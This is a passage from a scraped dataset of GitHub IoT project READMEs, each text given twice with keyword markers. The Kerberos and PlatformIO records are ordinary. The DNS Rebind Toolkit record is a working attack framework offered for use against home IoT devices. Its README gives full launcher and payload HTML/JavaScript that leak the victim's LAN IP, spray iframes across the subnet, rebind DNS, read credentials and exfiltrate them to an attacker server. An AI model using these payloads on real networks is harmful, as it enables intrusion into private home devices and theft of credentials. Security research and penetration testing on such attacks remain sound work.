cloud.\nIf you want to manage more than 10 Kerberos agents, it's recommended to use Kerberos Enterprise. This will help you to scale, support high availability and load balancing. Check out the architecture section for a better understanding of when to use what.\nMachinery\nThe machinery is the processing engine of Kerberos Open Source. It's an image processing framework, written in C++, who benefits from other third party libraries (OpenCV, etc). It takes images from the type of camera (USB-, IP- or RPi-camera) you've configured in the configuration files and executes one or more algorithms and post-processes (e.g. save a snapshot). The configuration files allow you to define the type of camera, post-processes, conditions and much more; it's highly configurable. It's important to note that the machinery, out-of-the-box, can handle only one camera at a time.\nHow does it work?\nRead more on our documentation website to have a better understanding of how the machinery works.\nInstallation\nKerberos Open Source comes with different installation flavours (it includes both the machinery and web repository). The reason is because depending on the use case one option is better than another. A short list of recommendations:\nKiOS: You have a Raspberry Pi, and you only want to run a Kerberos agent on it.\nRaspbian: You have a Raspberry Pi, but you want other services running next to the Kerberos agent.\nDocker: You have a lot of IP cameras, and/or don't want to mess with dependencies.\nGeneric: You want to develop/extend Kerberos with your own features, or you want to run a Kerberos agent on a not supported OS/architecure.\nCompile from source\nUpdate the packages and kernel, and install some development tools.\nsudo apt-get update && sudo apt-get upgrade\nsudo apt-get install git cmake subversion libav-tools dh-autoreconf libcurl4-openssl-dev yasm libx264-dev pkg-config libssl-dev\nInstall the FFmpeg library with x264 support.\ngit clone https://github.com/FFmpeg/FFmpeg ffmpeg\ncd ffmpeg && git checkout remotes/origin/release/2.8\n./configure --enable-gpl --enable-libx264 --enable-shared --prefix=/usr/local\nmake && sudo make install\nGo to your home directory, or any place your prefer and pull the machinery from Github. Afterwards create a build directory and start the compilation.\ncd && git clone https://github.com/kerberos-io/machinery\ncd machinery && mkdir build && cd build\ncmake .. && make && make check && sudo make install\nAfter the machinery is build and installed succesfully, you can enable kerberosio to start on boot.\nsudo systemctl enable kerberosio", "link": "https://github.com/kerberos-io/machinery", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "kerberos open source - machinery\nlicense\nthe kerberos open source project is licensed with by-nc-sa 4.0, this means that everyone can use kerberos and modify if to their needs, in a non commercial activity.\nmore information about this license.\nvote for features\nreport features if you think something is missing, and should be added to kerberos open source, we love to hear about your ideas.\nsupported cameras\nin this thread you can find a list of cameras that users confirmed working properly. do you have a working camera missing from this list? report your camera here.\nwhy kerberos?\nas burglary is very common, we believe that video surveillance is a trivial -----> tool !!!  in our daily lifes which helps us to feel a little bit more secure. responding to this need, a lot of companies have started developing their own video surveillance software in the past few years.\nnowadays we have a myriad of expensive cameras, recorders, and software solutions which are mainly outdated and difficult to install and use. kerberos open source goal is to solve these problems and to provide every human being in this world to have their own ecological, affordable, easy-to-use and innovative surveillance solution.\nintroduction\nkerberos open source is perfect for personal usage. it's great if you only have a couple of surveillance cameras to be managed. a kerberos agent (e.g. on a raspberry pi or inside a docker container) runs for each camera. their are many different installation possibilities, please have a look at the architecture or installation page.\nevery kerberos agent has it's own web interface (front-end) to review media recording, and processing engine (back-end) of a specific surveillance camera. the open source version doesn't come with a central overview of all recordings generated by your kerberos agents. for this feature we highly recommend kerberos cloud.\nif you want to manage more than 10 kerberos agents, it's recommended to use kerberos enterprise. this will help you to scale, support high availability and load balancing. check out the architecture section for a better understanding of when to use what.\nmachinery\nthe machinery is the processing engine of kerberos open source. it's an image processing framework, written in c++, who benefits from other third party libraries (opencv, etc). it takes images from the type of camera (usb-, ip- or rpi-camera) you've configured in the configuration files and executes one or more algorithms and post-processes (e.g. save a snapshot). the configuration files allow you to define the type of camera, post-processes, conditions and much more; it's highly configurable. it's important to note that the machinery, out-of-the-box, can handle only one camera at a time.\nhow does it work?\nread more on our documentation website to have a better understanding of how the machinery works.\ninstallation\nkerberos open source comes with different installation flavours (it includes both the machinery and web repository). the reason is because depending on the use case one option is better than another. a short list of recommendations:\nkios: you have a raspberry pi, and you only want to run a kerberos agent on it.\nraspbian: you have a raspberry pi, but you want other services running next to the kerberos agent.\ndocker: you have a lot of ip cameras, and/or don't want to mess with dependencies.\ngeneric: you want to develop/extend kerberos with your own features, or you want to run a kerberos agent on a not supported os/architecure.\ncompile from source\nupdate the packages and kernel, and install some development tools.\nsudo apt-get update && sudo apt-get upgrade\nsudo apt-get install git cmake subversion libav-tools dh-autoreconf libcurl4-openssl-dev yasm libx264-dev pkg-config libssl-dev\ninstall the ffmpeg library with x264 support.\ngit clone https://github.com/ffmpeg/ffmpeg ffmpeg\ncd ffmpeg && git checkout remotes/origin/release/2.8\n./configure --enable-gpl --enable-libx264 --enable-shared --prefix=/usr/local\nmake && sudo make install\ngo to your home directory, or any place your prefer and pull the machinery from github. afterwards create a build directory and start the compilation.\ncd && git clone https://github.com/kerberos-io/machinery\ncd machinery && mkdir build && cd build\ncmake .. && make && make check && sudo make install\nafter the machinery is build and installed succesfully, you can enable kerberosio to start on boot.\nsudo systemctl enable kerberosio", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000192, "year": null}, {"Unnamed: 0": 197, "autor": 197, "date": null, "content": "PlatformIO IDE for Atom\nA new generation toolset for embedded C/C++ development\nPlatformIO is a new generation ecosystem for embedded development.\nOpen source, maximum permissive Apache 2.0 license\nCross-platform IDE and Unified Debugger\nStatic Code Analyzer and Remote Unit Testing\nMulti-platform and Multi-architecture Build System\nFirmware File Explorer and Memory Inspection.\nPlatforms: Atmel AVR, Atmel SAM, Espressif 32, Espressif 8266, Freescale Kinetis, Infineon XMC, Intel ARC32, Lattice iCE40, Maxim 32, Microchip PIC32, Nordic nRF51, Nordic nRF52, NXP LPC, RISC-V, Samsung ARTIK, Silicon Labs EFM32, ST STM32, Teensy, TI MSP430, TI Tiva, WIZNet W7500\nFrameworks: Arduino, ARTIK SDK, CMSIS, Energia, ESP-IDF, libOpenCM3, mbed, Pumbaa, Simba, SPL, STM32Cube, WiringPi\nFeatures\nCross-platform code builder without external dependencies to a system software:\n500+ embedded boards\n25+ development platforms\n15+ frameworks\nPIO Remote\nPIO Unified Debugger\nUnit Testing\nC/C++ Intelligent Code Completion\nC/C++ Smart Code Linter for rapid professional development\nLibrary Manager for the hundreds popular libraries\nMulti-projects workflow with multiple panes\nThemes support with dark and light colors\nSerial Port Monitor\nBuilt-in Terminal with PlatformIO Core tool (pio, platformio)\nHow it works\nPlease follow to the official documentation PlatformIO IDE for Atom.\nLicense\nCopyright (c) 2016-present PlatformIO contact@platformio.org\nThe PlatformIO IDE for Atom is licensed under the permissive Apache 2.0 license, so you can use it in both commercial and personal projects with confidence.", "link": "https://github.com/platformio/platformio-atom-ide", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "platformio ide for atom\na new generation toolset for embedded c/c++ development\nplatformio is a new generation ecosystem for embedded development.\nopen source, maximum permissive apache 2.0 license\ncross-platform ide and unified debugger\nstatic code analyzer and remote unit testing\nmulti-platform and multi-architecture build system\nfirmware file explorer and memory inspection.\nplatforms: atmel avr, atmel sam, espressif 32, espressif 8266, freescale kinetis, infineon xmc, intel arc32, lattice ice40, maxim 32, microchip pic32, nordic nrf51, nordic nrf52, nxp lpc, risc-v, samsung artik, silicon labs efm32, st stm32, teensy, ti msp430, ti tiva, wiznet w7500\nframeworks: arduino, artik sdk, cmsis, energia, esp-idf, libopencm3, mbed, pumbaa, simba, spl, stm32cube, wiringpi\nfeatures\ncross-platform code builder without external dependencies to a system software:\n500+ embedded boards\n25+ development platforms\n15+ frameworks\npio remote\npio unified debugger\nunit testing\nc/c++ intelligent code completion\nc/c++ smart code linter for rapid professional development\nlibrary manager for the hundreds popular libraries\nmulti-projects workflow with multiple panes\nthemes support with dark and light colors\nserial port monitor\nbuilt-in terminal with platformio core -----> tool !!!  (pio, platformio)\nhow it works\nplease follow to the official documentation platformio ide for atom.\nlicense\ncopyright (c) 2016-present platformio contact@platformio.org\nthe platformio ide for atom is licensed under the permissive apache 2.0 license, so you can use it in both commercial and personal projects with confidence.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000197, "year": null}, {"Unnamed: 0": 206, "autor": 206, "date": null, "content": "DNS Rebind Toolkit\nDemo | Security Advisory | Included Payloads | FAQ\nDISCLAIMER: This software is for educational purposes only. This software should not be used for illegal activity. The author is not responsible for its use. Don't be a dick.\nDNS Rebind Toolkit is a frontend JavaScript framework for developing DNS Rebinding exploits against vulnerable hosts and services on a local area network (LAN). It can be used to target devices like Google Home, Roku, Sonos WiFi speakers, WiFi routers, \"smart\" thermostats, and other IoT devices. With this toolkit, a remote attacker can bypass a router's firewall and directly interact with devices on the victim's home network, exfiltrating private information and in some cases, even controlling the vulnerable devices themselves.\nThe attack requires a victim on the target network to simply follow a link, or be shown an HTML ad containing a malicious iframe. From their, the victim's web browser is used like a proxy to directly access other hosts connected to their home network. These target machines and services would otherwise be unavailable to the attacker from the Internet. The remote attacker may not know what those services are, or what IP addresses they occupy on the victim's network, but DNS Rebind Toolkit handles this by brute forcing hundreds of likely IP addresses.\nUnder the hood, this tool makes use of a public whonow DNS server running on rebind.network:53 to execute the DNS rebinding attack and fool the victim's web browser into violating the Same-origin policy. From their, it uses WebRTC to leak the victim's private IP address, say 192.168.1.36. It uses the first three octets of this local IP address to guess the network's subnet and then inject 256 iframes, from 192.168.1.0-255 delivering a payload to each host that could possibly be on the network subnet.\nThis toolkit can be used to develop and deploy your own DNS rebinding attacks. Several real-world attack payloads are included with this toolkit in the payloads/ directory. These payloads include information exfiltration (and rickroll tom-foolery) attacks against a few popular IoT devices, including Google Home and Roku products.\nThis toolkit is the product of independent security research into DNS Rebinding attacks. You can read about that original research here.\nGetting Started\n# clone the repo\ngit clone https://github.com/brannondorsey/dns-rebind-toolkit.git\ncd dns-rebind-toolkit\n# install dependencies\nnpm install\n# run the server using root to provide access to privileged port 80\n# this script serves files from the www/, /examples, /share, and /payloads directories\nsudo node server\nBy default, server.js serves payloads targeting Google Home, Roku, Sonos speakers, Phillips Hue light bulbs and Radio Thermostat devices running their services on ports 8008, 8060, 1400, 80 and 80 respectively. If you've got one of these devices on your home network, navigate to http://rebind.network for a nice surprise ;). Open the developer's console and watch as these services are harmlessly exploited causing data to be stolen from them and exfiltrated to server.js.\nAPI and Usage\nThis toolkit provides two JavaScript objects that can be used together to create DNS rebinding attacks:\nDNSRebindAttack: This object is used to launch an attack against a vulnerable service running on a known port. It spawns one payload for each IP address you choose to target. DNSRebindAttack objects are used to create, manage, and communicate with multiple DNSRebindNode objects. Each payload launched by DNSRebindAttack must contain a DNSRebindNode object.\nDNSRebindNode: This static class object should be included in each HTML payload file. It is used to target one service running on one host. It can communicate with the DNSRebindAttack object that spawned it and it has helper functions to execute the DNS rebinding attack (using DNSRebindNode.rebind(...)) as well as exfiltrate data discovered during the attack to server.js (DNSRebindNode.exfiltrate(...)).\nThese two scripts are used together to execute an attack against unknown hosts on a firewall protected LAN. A basic attack looks like this:\nAttacker sends victim a link to a malicious HTML page that launches the attack: e.g. http://example.com/launcher.html. launcher.html contains an instance of DNSRebindAttack.\nThe victim follows the attacker's link, or visits a page where http://example.com/launcher.html is embedded as an iframe. This causes the DNSRebindAttack on launcher.html to begin the attack.\nDNSRebindAttack uses a WebRTC leak to discover the local IP address of the victim machine (e.g. 192.168.10.84). The attacker uses this information to choose a range of IP addresses to target on the victim's LAN (e.g. 192.168.10.0-255).\nlauncher.html launches the DNS rebinding attack (using DNSRebindAttack.attack(...)) against a range of IP addresses on the victim's subnet, targeting a single service (e.g. the undocumented Google Home REST API available on port 8008).\nAt an interval defined by the user (200 milliseconds by default), DNSRebindAttack embeds one iframe containing payload.html into the launcher.html page. Each iframe contains one DNSRebindNode object that executes an attack against port 8008 of a single host defined in the range of IP addresses being attacked. This injection process continues until an iframe has been injected for each IP address that is being targeted by the attack.\nEach injected payload.html file uses DNSRebindNode to attempt a rebind attack by communicating with a whonow DNS server. If it succeeds, same-origin policy is violated and payload.html can communicate with the Google Home product directly. Usually payload.html will be written in such a way that it makes a few API calls to the target device and exfiltrates the results to server.js running on example.com before finishing the attack and destroying itself.\nNote, if a user has one Google Home device on their network with an unknown IP address and an attack is launched against the entire 192.168.1.0/24 subnet, then one DNSRebindNode's rebind attack will be successful and 254 will fail.\nExamples\nAn attack consists of three coordinated scripts and files:\nAn HTML file containing an instance of DNSRebindAttack (e.g. launcher.html)\nAn HTML file containing the attack payload (e.g. payload.html). This file is embedded into launcher.html by DNSRebindAttack for each IP address being targetted.\nA DNS Rebinding Toolkit server (server.js) to deliver the above files and exfiltrate data if need be.\nlauncher.html\nHere is an example HTML launcher file. You can find the complete document in examples/launcher.html.\n<!DOCTYPE html>\n<head>\n<title>Example launcher</title>\n</head>\n<body>\n<!-- This script is a depency of DNSRebindAttack.js and must be included -->\n<script type=\"text/javascript\" src=\"/share/js/EventEmitter.js\"></script>\n<!-- Include the DNS Rebind Attack object -->\n<script type=\"text/javascript\" src=\"/share/js/DNSRebindAttack.js\"></script>\n<script type=\"text/javascript\">\n// DNSRebindAttack has a static method that uses WebRTC to leak the\n// browser's IP address on the LAN. We'll use this to guess the LAN's IP\n// subnet. If the local IP is 192.168.1.89, we'll launch 255 iframes\n// targetting all IP addresses from 192.168.1.1-255\nDNSRebindAttack.getLocalIPAddress()\n.then(ip => launchRebindAttack(ip))\n.catch(err => {\nconsole.error(err)\n// Looks like our nifty WebRTC leak trick didn't work (doesn't work\n// in some browsers). No biggie, most home networks are 192.168.1.1/24\nlaunchRebindAttack('192.168.1.1')\n})\nfunction launchRebindAttack(localIp) {\n// convert 192.168.1.1 into array from 192.168.1.0 - 192.168.1.255\nconst first3Octets = localIp.substring(0, localIp.lastIndexOf('.'))\nconst ips = [...Array(256).keys()].map(octet => `${first3Octets}.${octet}`)\n// The first argument is the domain name of a publicly accessible\n// whonow server (https://github.com/brannondorsey/whonow).\n// I've got one running on port 53 of rebind.network you can to use.\n// The services you are attacking might not be running on port 80 so\n// you will probably want to change that too.\nconst rebind = new DNSRebindAttack('rebind.network', 80)\n// Launch a DNS Rebind attack, spawning 255 iframes attacking the service\n// on each host of the subnet (or so we hope).\n// Arguments are:\n// 1) target ip addresses\n// 2) IP address your Node server.js is running on. Usually 127.0.0.1\n// during dev, but then the publicly accessible IP (not hostname)\n// of the VPS hosting this repo in production.\n// 3) the HTML payload to deliver to this service. This HTML file should\n// have a DNSRebindNode instance implemented on in it.\n// 4) the interval in milliseconds to wait between each new iframe\n// embed. Spawning 100 iframes at the same time can choke (or crash)\n// a browser. The higher this value, the longer the attack takes,\n// but the less resources it consumes.\nrebind.attack(ips, '127.0.0.1', 'examples/payload.html', 200)\n// rebind.nodes is also an EventEmitter, only this one is fired using\n// DNSRebindNode.emit(...). This allows DNSRebindNodes inside of\n// iframes to post messages back to the parent DNSRebindAttack that\n// launched them. You can define custome events by simply emitting\n// DNSRebindNode.emit('my-custom-event') and a listener in rebind.nodes\n// can receive it. That said, there are a few standard event names that\n// get triggered automagically:\n// - begin: triggered when DNSRebindNode.js is loaded. This signifies\n// that an attack has been launched (or at least, it's payload was\n// delivered) against an IP address.\n// - rebind: the DNS rebind was successful, this node should now be\n// communicating with the target service.\n// - exfiltrate: send JSON data back to your Node server.js and save\n// it inside the data/ folder.\n// Additionally, the DNSRebindNode.destroy() static method\n// will trigger the 'destory' event and cause DNSRebindAttack to\n// remove the iframe.\nrebind.nodes.on('begin', (ip) => {\n// the DNSRebindNode has been loaded, attacking ip\n})\nrebind.nodes.on('rebind', (ip) => {\n// the rebind was successful\nconsole.log('node rebind', ip)\n})\nrebind.nodes.on('exfiltrate', (ip, data) => {\n// JSON data was exfiltrated and saved to the data/\n// folder on the remote machine hosting server.js\nconsole.log('node exfiltrate', ip, data)\n// data = {\n// \"username\": \"crashOverride\",\n// \"password\": \"hacktheplanet!\",\n// }\n})\n}\n</script>\n</body>\n</html>\npayload.html\nHere is an example HTML payload file. You can find the complete document in examples/payload.html.\n<!DOCTYPE html>\n<html>\n<head>\n<title>Example Payload</title>\n</head>\n<body>\n<!--\nLoad the DNSRebindNode. This static class is used to launch the rebind\nattack and communicate with the DNSRebindAttack instance in example-launcher.html\n-->\n<script type=\"text/javascript\" src=\"/share/js/DNSRebindNode.js\"></script>\n<script type=\"text/javascript\">\nattack()\n.then(() => {},\nerr => {\n// there was an error at some point during the attack\nconsole.error(err)\nDNSRebindNode.emit('fatal', err.message)\n}\n) // remove this iframe by calling destroy()\n.then(() => DNSRebindNode.destroy())\n// launches the attack and returns a promise that is resolved if the target\n// service is found and correctly exploited, or more likely, rejected because\n// this host doesn't exist, the target service isn't running, or something\n// went wrong with the exploit. Remember that this attack is being launched\n// against 255+ IP addresses, so most of them won't succeed.\nasync function attack() {\n// DNSRebindNode has some default fetch options that specify things\n// like no caching, etc. You can re-use them for convenience, or ignore\n// them and create your own options object for each fetch() request.\n// Here are their default values:\n// {\n// method: \"GET\",\n// headers: {\n// // this doesn't work in all browsers. For instance,\n// // Firefox doesn't let you do this.\n// \"Origin\": \"\", // unset the origin header\n// \"Pragma\": \"no-cache\",\n// \"Cache-Control\": \"no-cache\"\n// },\n// cache: \"no-cache\"\n// }\nconst getOptions = DNSRebindNode.fetchOptions()\ntry {\n// In this example, we'll pretend we are attacking some service with\n// an /auth.json file with username/password sitting in plaintext.\n// Before we swipe those creds, we need to first perform the rebind\n// attack. Most likely, our webserver will cache the DNS results\n// for this page's host. DNSRebindNode.rebind(...) recursively\n// re-attempts to rebind the host with a new, target IP address.\n// This can take over a minute, and if it is unsuccessful the\n// promise is rejected.\nconst opts = {\n// these options get passed to the DNS rebind fetch request\nfetchOptions: getOptions,\n// by default, DNSRebindNode.rebind() is considered successful\n// if it receives an HTTP 200 OK response from the target service.\n// However, you can define any kind of \"rebind success\" scenario\n// yourself with the successPredicate(...) function. This\n// function receives a fetch result as a parameter and the return\n// value determines if the rebind was successful (i.e. you are\n// communicating with the target server). Here we check to see\n// if the fetchResult was sent by our example vulnerable server.\nsuccessPredicate: (fetchResult) => {\nreturn fetchResult.headers.get('Server') == 'Example Vulnerable Server v1.0'\n}\n}\n// await the rebind. Can take up to over a minute depending on the\n// victim's DNS cache settings or if there is no host listening on\n// the other side.\nawait DNSRebindNode.rebind(`http://${location.host}/auth.json`, opts)\n} catch (err) {\n// whoops, the rebind failed. Either the browser's DNS cache was\n// never cleared, or more likely, this service isn't running on the\n// target host. Oh well... Bubble up the rejection and have our\n// attack()'s rejection handler deal w/ it.\nreturn Promise.reject(err)\n}\ntry {\n// alrighty, now that we've rebound the host and are communicating\n// with the target service, let's grab the credentials\nconst creds = await fetch(`http://${location.host}/auth.json`)\n.then(res => res.json())\n// {\n// \"username\": \"crashOverride\",\n// \"password\": \"hacktheplanet!\",\n// }\n// console.log(creds)\n// great, now let's exfiltrate those creds to the Node.js server\n// running this whole shebang. That's the last thing we care about,\n// so we will just return this promise as the result of attack()\n// and let its handler's deal with it.\n//\n// NOTE: the second argument to exfiltrate(...) must be JSON\n// serializable.\nreturn DNSRebindNode.exfiltrate('auth-example', creds)\n} catch (err) {\nreturn Promise.reject(err)\n}\n}\n</script>\n</body>\n</html>\nserver.js\nThis script is used to deliver the launcher.html and payload.html files, as well as receive and save exifltrated data from the DNSRebindNode to the data/ folder. For development, I usually run this server on localhost and point DNSRebindAttack.attack(...) towards 127.0.0.1. For production, I run the server on a VPS cloud server and point DNSRebindAttack.attack(...) to its public IP address.\n# run with admin privileged so that it can open port 80.\nsudo node server\nusage: server [-h] [-v] [-p PORT]\nDNS Rebind Toolkit server\nOptional arguments:\n-h, --help Show this help message and exit.\n-v, --version Show program's version number and exit.\n-p PORT, --port PORT Which ports to bind the servers on. May include\nmultiple like: --port 80 --port 1337 (default: -p 80\n-p 8008 -p 8060 -p 1337)\nMore Examples\nI've included an example vulnerable server in examples/vulnerable-server.js. This vulnerable service MUST be run from another machine on your network, as it's port MUST match the same port as server.js. To run this example attack yourself, do the following:\nSecondary Computer\n# clone the repo\ngit clone https://github.com/brannondorsey/dns-rebind-toolkit\ncd dns-rebind-toolkit\n# launch the vulnerable server\nnode examples/vulnerable-server\n# ...\n# vulnerable server is listening on 3000\nPrimary Computer\nnode server --port 3000\nNow, navigate your browser to http://localhost:3000/launcher.html and open a dev console. Wait a minute or two, if the attack worked you should see some dumped credz from the vulnerable server running on the secondary computer.\nCheck out the examples/ and payloads/ directories for more examples.\nFiles and Directories\nserver.js: The DNS Rebind Toolkit server\npayloads/: Several HTML payload files hand-crafted to target a few vulnerable IoT devices. Includes attacks against Google Home, Roku, and Radio Thermostat for now. I would love to see more payloads added to this repo in the future (PRs welcome!)\nexamples/: Example usage files.\ndata/: Directory where data exfiltrated by DNSRebindNode.exfiltrate(...) is saved.\nshare/: Directory of JavaScript files shared by multiple HTML files in examples/ and payload/.\nThis toolkit was developed to be a useful tool for researchers and penetration testers. If you'd like to see some of the research that led to it's creation, check out this post. If you write a payload for another service, consider making a PR to this repository so that others can benefit from your work!", "link": "https://github.com/brannondorsey/dns-rebind-toolkit", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "dns rebind toolkit\ndemo | security advisory | included payloads | faq\ndisclaimer: this software is for educational purposes only. this software should not be used for illegal activity. the author is not responsible for its use. don't be a dick.\ndns rebind toolkit is a frontend javascript framework for developing dns rebinding exploits against vulnerable hosts and services on a local area network (lan). it can be used to target devices like google home, roku, sonos wifi speakers, wifi routers, \"smart\" thermostats, and other iot devices. with this toolkit, a remote attacker can bypass a router's firewall and directly interact with devices on the victim's home network, exfiltrating private information and in some cases, even controlling the vulnerable devices themselves.\nthe attack requires a victim on the target network to simply follow a link, or be shown an html ad containing a malicious iframe. from their, the victim's web browser is used like a proxy to directly access other hosts connected to their home network. these target machines and services would otherwise be unavailable to the attacker from the internet. the remote attacker may not know what those services are, or what ip addresses they occupy on the victim's network, but dns rebind toolkit handles this by brute forcing hundreds of likely ip addresses.\nunder the hood, this -----> tool !!!  makes use of a public whonow dns server running on rebind.network:53 to execute the dns rebinding attack and fool the victim's web browser into violating the same-origin policy. from their, it uses webrtc to leak the victim's private ip address, say 192.168.1.36. it uses the first three octets of this local ip address to guess the network's subnet and then inject 256 iframes, from 192.168.1.0-255 delivering a payload to each host that could possibly be on the network subnet.\nthis toolkit can be used to develop and deploy your own dns rebinding attacks. several real-world attack payloads are included with this toolkit in the payloads/ directory. these payloads include information exfiltration (and rickroll tom-foolery) attacks against a few popular iot devices, including google home and roku products.\nthis toolkit is the product of independent security research into dns rebinding attacks. you can read about that original research here.\ngetting started\n# clone the repo\ngit clone https://github.com/brannondorsey/dns-rebind-toolkit.git\ncd dns-rebind-toolkit\n# install dependencies\nnpm install\n# run the server using root to provide access to privileged port 80\n# this script serves files from the www/, /examples, /share, and /payloads directories\nsudo node server\nby default, server.js serves payloads targeting google home, roku, sonos speakers, phillips hue light bulbs and radio thermostat devices running their services on ports 8008, 8060, 1400, 80 and 80 respectively. if you've got one of these devices on your home network, navigate to http://rebind.network for a nice surprise ;). open the developer's console and watch as these services are harmlessly exploited causing data to be stolen from them and exfiltrated to server.js.\napi and usage\nthis toolkit provides two javascript objects that can be used together to create dns rebinding attacks:\ndnsrebindattack: this object is used to launch an attack against a vulnerable service running on a known port. it spawns one payload for each ip address you choose to target. dnsrebindattack objects are used to create, manage, and communicate with multiple dnsrebindnode objects. each payload launched by dnsrebindattack must contain a dnsrebindnode object.\ndnsrebindnode: this static class object should be included in each html payload file. it is used to target one service running on one host. it can communicate with the dnsrebindattack object that spawned it and it has helper functions to execute the dns rebinding attack (using dnsrebindnode.rebind(...)) as well as exfiltrate data discovered during the attack to server.js (dnsrebindnode.exfiltrate(...)).\nthese two scripts are used together to execute an attack against unknown hosts on a firewall protected lan. a basic attack looks like this:\nattacker sends victim a link to a malicious html page that launches the attack: e.g. http://example.com/launcher.html. launcher.html contains an instance of dnsrebindattack.\nthe victim follows the attacker's link, or visits a page where http://example.com/launcher.html is embedded as an iframe. this causes the dnsrebindattack on launcher.html to begin the attack.\ndnsrebindattack uses a webrtc leak to discover the local ip address of the victim machine (e.g. 192.168.10.84). the attacker uses this information to choose a range of ip addresses to target on the victim's lan (e.g. 192.168.10.0-255).\nlauncher.html launches the dns rebinding attack (using dnsrebindattack.attack(...)) against a range of ip addresses on the victim's subnet, targeting a single service (e.g. the undocumented google home rest api available on port 8008).\nat an interval defined by the user (200 milliseconds by default), dnsrebindattack embeds one iframe containing payload.html into the launcher.html page. each iframe contains one dnsrebindnode object that executes an attack against port 8008 of a single host defined in the range of ip addresses being attacked. this injection process continues until an iframe has been injected for each ip address that is being targeted by the attack.\neach injected payload.html file uses dnsrebindnode to attempt a rebind attack by communicating with a whonow dns server. if it succeeds, same-origin policy is violated and payload.html can communicate with the google home product directly. usually payload.html will be written in such a way that it makes a few api calls to the target device and exfiltrates the results to server.js running on example.com before finishing the attack and destroying itself.\nnote, if a user has one google home device on their network with an unknown ip address and an attack is launched against the entire 192.168.1.0/24 subnet, then one dnsrebindnode's rebind attack will be successful and 254 will fail.\nexamples\nan attack consists of three coordinated scripts and files:\nan html file containing an instance of dnsrebindattack (e.g. launcher.html)\nan html file containing the attack payload (e.g. payload.html). this file is embedded into launcher.html by dnsrebindattack for each ip address being targetted.\na dns rebinding toolkit server (server.js) to deliver the above files and exfiltrate data if need be.\nlauncher.html\nhere is an example html launcher file. you can find the complete document in examples/launcher.html.\n<!doctype html>\n<head>\n<title>example launcher</title>\n</head>\n<body>\n<!-- this script is a depency of dnsrebindattack.js and must be included -->\n<script type=\"text/javascript\" src=\"/share/js/eventemitter.js\"></script>\n<!-- include the dns rebind attack object -->\n<script type=\"text/javascript\" src=\"/share/js/dnsrebindattack.js\"></script>\n<script type=\"text/javascript\">\n// dnsrebindattack has a static method that uses webrtc to leak the\n// browser's ip address on the lan. we'll use this to guess the lan's ip\n// subnet. if the local ip is 192.168.1.89, we'll launch 255 iframes\n// targetting all ip addresses from 192.168.1.1-255\ndnsrebindattack.getlocalipaddress()\n.then(ip => launchrebindattack(ip))\n.catch(err => {\nconsole.error(err)\n// looks like our nifty webrtc leak trick didn't work (doesn't work\n// in some browsers). no biggie, most home networks are 192.168.1.1/24\nlaunchrebindattack('192.168.1.1')\n})\nfunction launchrebindattack(localip) {\n// convert 192.168.1.1 into array from 192.168.1.0 - 192.168.1.255\nconst first3octets = localip.substring(0, localip.lastindexof('.'))\nconst ips = [...array(256).keys()].map(octet => `${first3octets}.${octet}`)\n// the first argument is the domain name of a publicly accessible\n// whonow server (https://github.com/brannondorsey/whonow).\n// i've got one running on port 53 of rebind.network you can to use.\n// the services you are attacking might not be running on port 80 so\n// you will probably want to change that too.\nconst rebind = new dnsrebindattack('rebind.network', 80)\n// launch a dns rebind attack, spawning 255 iframes attacking the service\n// on each host of the subnet (or so we hope).\n// arguments are:\n// 1) target ip addresses\n// 2) ip address your node server.js is running on. usually 127.0.0.1\n// during dev, but then the publicly accessible ip (not hostname)\n// of the vps hosting this repo in production.\n// 3) the html payload to deliver to this service. this html file should\n// have a dnsrebindnode instance implemented on in it.\n// 4) the interval in milliseconds to wait between each new iframe\n// embed. spawning 100 iframes at the same time can choke (or crash)\n// a browser. the higher this value, the longer the attack takes,\n// but the less resources it consumes.\nrebind.attack(ips, '127.0.0.1', 'examples/payload.html', 200)\n// rebind.nodes is also an eventemitter, only this one is fired using\n// dnsrebindnode.emit(...). this allows dnsrebindnodes inside of\n// iframes to post messages back to the parent dnsrebindattack that\n// launched them. you can define custome events by simply emitting\n// dnsrebindnode.emit('my-custom-event') and a listener in rebind.nodes\n// can receive it. that said, there are a few standard event names that\n// get triggered automagically:\n// - begin: triggered when dnsrebindnode.js is loaded. this signifies\n// that an attack has been launched (or at least, it's payload was\n// delivered) against an ip address.\n// - rebind: the dns rebind was successful, this node should now be\n// communicating with the target service.\n// - exfiltrate: send json data back to your node server.js and save\n// it inside the data/ folder.\n// additionally, the dnsrebindnode.destroy() static method\n// will trigger the 'destory' event and cause dnsrebindattack to\n// remove the iframe.\nrebind.nodes.on('begin', (ip) => {\n// the dnsrebindnode has been loaded, attacking ip\n})\nrebind.nodes.on('rebind', (ip) => {\n// the rebind was successful\nconsole.log('node rebind', ip)\n})\nrebind.nodes.on('exfiltrate', (ip, data) => {\n// json data was exfiltrated and saved to the data/\n// folder on the remote machine hosting server.js\nconsole.log('node exfiltrate', ip, data)\n// data = {\n// \"username\": \"crashoverride\",\n// \"password\": \"hacktheplanet!\",\n// }\n})\n}\n</script>\n</body>\n</html>\npayload.html\nhere is an example html payload file. you can find the complete document in examples/payload.html.\n<!doctype html>\n<html>\n<head>\n<title>example payload</title>\n</head>\n<body>\n<!--\nload the dnsrebindnode. this static class is used to launch the rebind\nattack and communicate with the dnsrebindattack instance in example-launcher.html\n-->\n<script type=\"text/javascript\" src=\"/share/js/dnsrebindnode.js\"></script>\n<script type=\"text/javascript\">\nattack()\n.then(() => {},\nerr => {\n// there was an error at some point during the attack\nconsole.error(err)\ndnsrebindnode.emit('fatal', err.message)\n}\n) // remove this iframe by calling destroy()\n.then(() => dnsrebindnode.destroy())\n// launches the attack and returns a promise that is resolved if the target\n// service is found and correctly exploited, or more likely, rejected because\n// this host doesn't exist, the target service isn't running, or something\n// went wrong with the exploit. remember that this attack is being launched\n// against 255+ ip addresses, so most of them won't succeed.\nasync function attack() {\n// dnsrebindnode has some default fetch options that specify things\n// like no caching, etc. you can re-use them for convenience, or ignore\n// them and create your own options object for each fetch() request.\n// here are their default values:\n// {\n// method: \"get\",\n// headers: {\n// // this doesn't work in all browsers. for instance,\n// // firefox doesn't let you do this.\n// \"origin\": \"\", // unset the origin header\n// 